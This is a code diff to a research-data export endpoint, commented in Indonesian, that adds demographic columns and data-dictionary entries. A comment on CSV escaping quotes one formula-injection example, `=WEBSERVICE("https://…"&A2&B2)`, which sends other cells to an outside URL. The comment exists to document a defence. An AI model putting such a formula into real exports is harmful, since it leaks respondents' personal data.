@@ -11,6 +11,13 @@ import {
 } from '~~/lib/cmdq/skala'
 import { ITEM_SUS } from '~~/lib/sus/item'
 import { LABEL_INTERPRETASI, TARGET_SUS } from '~~/lib/sus/skoring'
+import {
+  OPSI_DIVISI,
+  OPSI_DURASI_KOMPUTER,
+  OPSI_JABATAN,
+  OPSI_MASA_KERJA,
+  OPSI_USIA,
+} from '~~/lib/sosiodemografi'
 
 /**
  * GET /api/admin/ekspor?format=xlsx|csv — ekspor data mentah penelitian.
@@ -90,7 +97,9 @@ export default defineEventHandler(async (event) => {
   const barisResponden = responden.map((r) => ({
     Kode: r.kodeResponden,
     ...(sertakanIdentitas ? { Nama: r.nama, Email: r.email } : {}),
-    Unit_Kerja: r.unitKerja ?? '',
+    Divisi: r.divisi ?? '',
+    Jabatan: r.jabatan ?? '',
+    Sub_Bagian: r.unitKerja ?? '',
     Setuju_Etik: r.setujuEtik ? 1 : 0,
     Tanggal_Persetujuan: r.tanggalPersetujuan?.toISOString().slice(0, 10) ?? '',
     Usia: r.usia ?? '',
@@ -100,8 +109,10 @@ export default defineEventHandler(async (event) => {
         ? 'Laki-laki'
         : 'Perempuan'
       : '',
-    Masa_Kerja_Tahun: r.masaKerjaTahun?.toNumber() ?? '',
-    Durasi_Komputer_Jam: r.durasiKomputerJamPerHari?.toNumber() ?? '',
+    // Kategori teks, bukan angka. Nama kolom mempertahankan satuan supaya
+    // pembaca kamus data tahu rentangnya dinyatakan dalam tahun/jam.
+    Masa_Kerja_Tahun: r.masaKerjaTahun ?? '',
+    Durasi_Komputer_Jam: r.durasiKomputerJamPerHari ?? '',
     Tinggi_cm: r.tinggiBadanCm?.toNumber() ?? '',
     Berat_kg: r.beratBadanKg?.toNumber() ?? '',
     IMT: r.imt?.toNumber() ?? '',
@@ -148,8 +159,9 @@ export default defineEventHandler(async (event) => {
     /**
      * Escape CSV + penangkal formula injection.
      *
-     * Tiga kolom berisi teks bebas yang diketik responden: `Nama`,
-     * `Unit_Kerja`, dan `Keterangan_Riwayat` (sampai 500 karakter). Excel dan
+     * Lima kolom berisi teks bebas yang diketik responden: `Nama`,
+     * `Divisi` dan `Jabatan` (bila ia memilih "Lainnya"), `Sub_Bagian`, dan
+     * `Keterangan_Riwayat` (sampai 500 karakter). Excel dan
      * LibreOffice memperlakukan sel yang diawali `=`, `+`, `-`, atau `@`
      * sebagai FORMULA dan menjalankannya saat berkas dibuka. Seorang responden
      * yang mendaftar dengan nama `=WEBSERVICE("https://…"&A2&B2)` — tanpa
@@ -293,6 +305,12 @@ export default defineEventHandler(async (event) => {
     { Variabel: 'Status_Profil / CMDQ / SUS', Keterangan: 'Kemajuan pengisian tiap instrumen', Kode: 'BELUM; SELESAI' },
     { Variabel: '(sel kosong)', Keterangan: 'Missing value', Kode: 'Responden sudah mendaftar tetapi belum melengkapi profil pekerja' },
     { Variabel: 'JK_Kode', Keterangan: 'Jenis kelamin', Kode: '1 = Laki-laki; 2 = Perempuan' },
+    { Variabel: 'Usia', Keterangan: 'Kelompok usia (kategorik, bukan angka)', Kode: OPSI_USIA.join('; ') },
+    { Variabel: 'Divisi', Keterangan: 'Divisi/departemen tempat responden bertugas', Kode: `${OPSI_DIVISI.join('; ')}. Nilai di luar daftar berasal dari pilihan "Lainnya" dan diketik sendiri oleh responden — kelompokkan ulang sebelum tabulasi silang.` },
+    { Variabel: 'Jabatan', Keterangan: 'Jenjang jabatan struktural', Kode: `${OPSI_JABATAN.join('; ')}. Idem soal "Lainnya".` },
+    { Variabel: 'Sub_Bagian', Keterangan: 'Seksi/sub-bagian yang lebih rinci dari divisi. Teks bebas dan OPSIONAL — kekosongannya bukan missing value.', Kode: '(teks bebas)' },
+    { Variabel: 'Masa_Kerja_Tahun', Keterangan: 'Kelompok masa kerja (kategorik, bukan angka)', Kode: OPSI_MASA_KERJA.join('; ') },
+    { Variabel: 'Durasi_Komputer_Jam', Keterangan: 'Kelompok durasi penggunaan komputer per hari (kategorik, bukan angka)', Kode: OPSI_DURASI_KOMPUTER.join('; ') },
     { Variabel: 'IMT_Kode', Keterangan: 'Kategori IMT (Kemenkes RI)', Kode: '1 = Kurus berat; 2 = Kurus ringan; 3 = Normal; 4 = Gemuk ringan; 5 = Obesitas' },
     { Variabel: 'Olahraga / Merokok / Riwayat_MSDs', Keterangan: 'Kebiasaan & riwayat', Kode: '0 = Tidak; 1 = Ya' },
     { Variabel: 'Frekuensi', Keterangan: 'Frekuensi keluhan CMDQ (kode pilihan)', Kode: labelFrekuensi },
